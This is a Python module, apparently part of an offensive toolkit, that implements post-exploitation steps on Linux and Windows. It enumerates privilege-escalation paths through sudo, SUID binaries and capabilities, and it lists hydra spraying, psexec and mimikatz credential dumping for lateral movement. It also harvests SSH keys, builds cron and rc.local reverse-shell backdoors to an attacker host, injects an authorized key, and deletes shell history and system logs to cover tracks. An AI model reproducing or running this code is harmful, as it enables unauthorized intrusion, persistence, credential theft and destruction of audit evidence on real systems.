# core/post_exploitation.py
# Post-Exploitation Module - Privilege Escalation, Lateral Movement, Persistence

import subprocess
import os
import platform
from typing import Dict, List

class PrivilegeEscalation:
    """Privilege Escalation - Linux & Windows"""
    
    def __init__(self):
        self.linux_techniques = {
            "sudo": "sudo -l",
            "suid": "find / -perm -4000 2>/dev/null",
            "caps": "getcap -r / 2>/dev/null",
            "cron": "cat /etc/crontab",
            "kernel": "uname -a",
            "services": "ps aux | grep -i service",
        }
        
        self.windows_techniques = {
            "whoami": "whoami /priv",
            "services": "tasklist",
            "registry": "reg query HKLM\\Software",
            "scheduled_tasks": "tasksched.msc",
            "kernel": "systeminfo",
        }
    
    def enum_linux(self) -> Dict:
        """Linux privilege escalation enumeration"""
        results = {}
        
        for tech, cmd in self.linux_techniques.items():
            try:
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                results[tech] = output.stdout
            except:
                pass
        
        return results
    
    def enum_windows(self) -> Dict:
        """Windows privilege escalation enumeration"""
        results = {}
        
        for tech, cmd in self.windows_techniques.items():
            try:
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                results[tech] = output.stdout
            except:
                pass
        
        return results
    
    def find_exploits(self) -> List[str]:
        """
        Sistem için uygun exploitleri bul
        """
        exploits = []
        
        if "linux" in platform.system().lower():
            enum = self.enum_linux()
            
            # SUDO kurallarını kontrol et
            if "sudo" in enum and "NOPASSWD" in enum["sudo"]:
                exploits.append("SUDO NOPASSWD vulnerability")
            
            # SUID binaries kontrol et
            if "suid" in enum:
                dangerous_suid = ["cp", "cat", "bash", "sh", "chmod", "chown"]
                for binary in dangerous_suid:
                    if binary in enum["suid"]:
                        exploits.append(f"SUID {binary} binary")
        
        elif "windows" in platform.system().lower():
            enum = self.enum_windows()
            
            # Unquoted service paths
            if "services" in enum:
                if "Program Files" in enum["services"]:
                    exploits.append("Unquoted service path vulnerability")
        
        return exploits

class LateralMovement:
    """Lateral Movement - Network & System"""
    
    def __init__(self):
        self.techniques = {
            "ssh_keys": "cat ~/.ssh/authorized_keys",
            "pass_spray": "hydra -L users.txt -P passwords.txt ssh",
            "psexec": "psexec -i \\\\target cmd.exe",
            "pass_hash": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        }
    
    def find_ssh_keys(self) -> List[str]:
        """SSH anahtarlarını bul"""
        keys = []
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            if ".ssh" in dirs:
                ssh_path = os.path.join(root, ".ssh")
                for key in os.listdir(ssh_path):
                    keys.append(os.path.join(ssh_path, key))
        return keys
    
    def enum_users(self) -> List[str]:
        """Sistem kullanıcılarını listele"""
        users = []
        try:
            if "linux" in platform.system().lower():
                output = subprocess.run("cat /etc/passwd", shell=True, capture_output=True, text=True)
                for line in output.stdout.split("\n"):
                    if ":" in line:
                        users.append(line.split(":")[0])
            else:
                output = subprocess.run("net user", shell=True, capture_output=True, text=True)
                users = output.stdout.split("\n")
        except:
            pass
        
        return users

class Persistence:
    """Persistence Mechanisms"""
    
    def __init__(self):
        pass
    
    def create_backdoor(self, method: str = "cron") -> str:
        """
        Backdoor oluştur
        """
        if method == "cron":
            # Cron backdoor
            cron_cmd = "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/port 0>&1' &>/dev/null"
            return f"echo '{cron_cmd}' | crontab -"
        
        elif method == "rc_local":
            # rc.local backdoor
            rc_cmd = "/bin/bash -c 'bash -i >& /dev/tcp/attacker/port 0>&1' &"
            return f"echo '{rc_cmd}' >> /etc/rc.local"
        
        elif method == "ssh_key":
            # SSH key persistence
            pub_key = "ssh-rsa AAAA..."
            return f"echo '{pub_key}' >> ~/.ssh/authorized_keys"
        
        return ""
    
    def cover_tracks(self) -> List[str]:
        """Logları sil"""
        commands = [
            "history -c",
            "cat /dev/null > ~/.bash_history",
            "cat /dev/null > /var/log/auth.log",
            "rm -rf /tmp/*",
            "find / -name '*.log' -delete",
        ]
        return commands

class PostExploitationFramework:
    """Main Post-Exploitation Framework"""
    
    def __init__(self):
        self.priv_esc = PrivilegeEscalation()
        self.lateral = LateralMovement()
        self.persistence = Persistence()
    
    def full_enumeration(self) -> Dict:
        """Tam sistem enumerate et"""
        results = {
            "privilege_escalation": {
                "exploits": self.priv_esc.find_exploits(),
                "enum": self.priv_esc.enum_linux() if "linux" in platform.system().lower() else self.priv_esc.enum_windows()
            },
            "lateral_movement": {
                "users": self.lateral.enum_users(),
                "ssh_keys": self.lateral.find_ssh_keys() if "linux" in platform.system().lower() else []
            },
            "persistence": {
                "backdoor_options": ["cron", "rc_local", "ssh_key"]
            }
        }
        
        return results
    
    def execute_priv_esc(self, technique: str) -> str:
        """Privilege escalation çalıştır"""
        exploits = self.priv_esc.find_exploits()
        
        if technique in exploits:
            return f"Executing {technique}..."
        
        return "Exploit not applicable"
